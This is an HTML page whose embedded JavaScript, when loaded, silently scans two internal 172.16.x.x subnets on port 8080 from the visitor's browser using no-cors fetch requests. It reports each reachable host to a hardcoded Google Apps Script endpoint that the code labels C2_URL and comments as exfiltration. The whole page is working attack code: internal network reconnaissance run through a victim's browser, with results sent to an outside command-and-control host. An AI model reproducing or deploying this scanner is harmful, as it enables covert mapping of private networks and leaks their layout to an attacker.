<!DOCTYPE html>
<html>
<head>
    <title>Adaptive Anomaly Hunter // Fetch Mode</title>
    <style>
        body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
        .success { border: 2px solid #0f0; padding: 10px; margin: 10px 0; background: #002200; font-size: 1.2em; }
        .stat-box { border-bottom: 1px solid #333; padding-bottom: 15px; margin-bottom: 20px; color: #888; }
        .highlight { color: #fff; font-weight: bold; }
        #progress-bar { width: 100%; background: #222; height: 10px; margin-top: 5px; }
        #progress-fill { height: 100%; background: #0f0; width: 0%; transition: width 0.1s; }
    </style>
</head>
<body>
    <h1>// ANOMALY HUNTER [FETCH API] //</h1>
    
    <div class="stat-box">
        <div>METHOD: <span class="highlight">Fetch (Connection Detection)</span></div>
        <div>SCOPE: <span class="highlight">172.16.0.0/24 & 172.16.1.0/24</span></div>
    </div>

    <div class="stat-box">
        <div>STATUS: <span id="scan-status" class="highlight">Initializing...</span></div>
        <div>PROGRESS: <span id="progress-text">0/508</span></div>
        <div id="progress-bar"><div id="progress-fill"></div></div>
    </div>
    
    <div id="results"></div>

    <script>
        // --- CONFIGURATION ---
        var C2_URL = "https://script.google.com/macros/s/AKfycbwWQQRwwAJ84yYCT6ykZpDCzTKsy0ZVom4_tDxSumkrFyhzXWpTR9er6b9k9auDkeTA/exec"; 
        var TARGET_PORT = 8080;
        var CONCURRENCY = 8;     // Safe limit for ChromeOS/Linux sockets
        var TIMEOUT = 1500;      // Abort connection attempts after 1.5s

        // --- TARGET LIST GENERATION ---
        var queue = [];
        // Generate both subnets
        [0, 1].forEach(subnet => {
            for(var i=1; i<255; i++) {
                queue.push("172.16." + subnet + "." + i);
            }
        });

        // SHUFFLE QUEUE: This prevents a block of dead IPs from clogging the stack
        // and ensures we hit 1.40 much earlier on average.
        for (let i = queue.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [queue[i], queue[j]] = [queue[j], queue[i]];
        }

        var totalTargets = queue.length;
        var completed = 0;

        // --- CORE SCANNER LOGIC ---
        async function checkTarget(ip) {
            const controller = new AbortController();
            const signal = controller.signal;
            const id = setTimeout(() => controller.abort(), TIMEOUT);

            try {
                // 'no-cors' is the magic. 
                // If it Connects (even 404/500), it RESOLVES.
                // If it Refuses/Timeouts, it REJECTS.
                await fetch(`http://${ip}:${TARGET_PORT}/favicon.ico?r=${Math.random()}`, { 
                    method: 'HEAD',
                    mode: 'no-cors', 
                    signal: signal 
                });
                
                // If we get here, the TCP connection was successful!
                reportSuccess(ip);

            } catch (error) {
                // Connection Refused or Timeout. Ignore.
            } finally {
                clearTimeout(id);
                updateProgress();
            }
        }

        function reportSuccess(ip) {
            var div = document.createElement("div");
            div.className = "success";
            div.innerText = ">> HOST CONFIRMED: " + ip;
            document.getElementById('results').appendChild(div);

            // Exfil
            fetch(C2_URL, {
                method: "POST", mode: "no-cors",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    type: "HOST_CONFIRMED",
                    target_ip: ip
                })
            });
        }

        function updateProgress() {
            completed++;
            document.getElementById('progress-text').innerText = completed + "/" + totalTargets;
            document.getElementById('progress-fill').style.width = ((completed / totalTargets) * 100) + "%";
            
            if(completed >= totalTargets) {
                if(document.getElementById('results').innerHTML === "") {
                    document.getElementById('scan-status').innerText = "SCAN COMPLETE. NO HOSTS FOUND.";
                } else {
                    document.getElementById('scan-status').innerText = "SCAN COMPLETE.";
                }
            }
        }

        // --- BATCH RUNNER ---
        async function runBatch() {
            document.getElementById('scan-status').innerText = "Scanning (Randomized Order)...";
            
            // Limit concurrency
            while(queue.length > 0) {
                const batch = queue.splice(0, CONCURRENCY).map(ip => checkTarget(ip));
                await Promise.all(batch);
            }
        }

        // Auto-start
        setTimeout(runBatch, 500);
    </script>
</body>
</html>
